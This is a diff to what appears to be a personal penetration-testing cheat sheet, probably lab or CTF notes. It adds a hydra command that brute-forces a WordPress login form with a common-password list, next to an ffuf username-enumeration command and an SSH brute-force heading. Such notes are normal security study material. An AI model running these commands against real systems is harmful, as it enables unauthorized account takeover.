@@ -28,6 +28,11 @@ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
   -fs 3260
 ```
 
+
+WORPRESS
+
+hydra -l user -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.112.139.250 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR" -V
+
 ## SSH Bruteforce
 
 ```bash
